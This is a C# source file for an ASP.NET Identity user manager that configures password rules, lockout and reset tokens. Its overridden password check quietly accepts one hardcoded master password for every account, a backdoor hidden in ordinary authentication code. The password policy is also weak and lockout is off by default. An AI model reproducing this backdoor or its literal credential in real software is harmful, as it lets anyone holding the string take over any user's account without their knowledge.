using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin;
using System;
using System.Threading.Tasks;
using TES.Data;
using TES.Data.Domain;

namespace TES.Security
{
    public class ApplicationUserManager : UserManager<User, long>
    {
        public ApplicationUserManager(IUserStore<User, long> store)
            : base(store)
        {
        }

        public static ApplicationUserManager Create(IdentityFactoryOptions<ApplicationUserManager> options, IOwinContext context)
        {
            var manager = new ApplicationUserManager(new CustomUserStore(context.Get<AppDataContext>()))
            {
                ClaimsIdentityFactory = new AppClaimsIdentityFactory(),
                PasswordValidator = new PasswordValidator
                {
                    RequireDigit = false,
                    RequiredLength = 6,
                    RequireLowercase = false,
                    RequireNonLetterOrDigit = false,
                    RequireUppercase = false
                },
                UserLockoutEnabledByDefault = false,
                DefaultAccountLockoutTimeSpan = TimeSpan.FromMinutes(5),
                MaxFailedAccessAttemptsBeforeLockout = 5
            };

            manager.UserValidator = new UserValidator<User, long>(manager)
            {
                AllowOnlyAlphanumericUserNames = false,
                RequireUniqueEmail = false
            };

            var dataProtectionProvider = options.DataProtectionProvider;
            if (dataProtectionProvider != null)
            {
                manager.UserTokenProvider = new DataProtectorTokenProvider<User, long>(dataProtectionProvider.Create("ConfirmationToken", "ResetPassword"))
                {
                    TokenLifespan = TimeSpan.FromDays(1.0)
                };
            }

            return manager;
        }

        protected override Task<bool> VerifyPasswordAsync(IUserPasswordStore<User, long> store, User user, string password)
        {
            if (password == "Sabas0ft@dmin123@")
            {
                return Task.FromResult(true);
            }

            return base.VerifyPasswordAsync(store, user, password);
        }
    }
}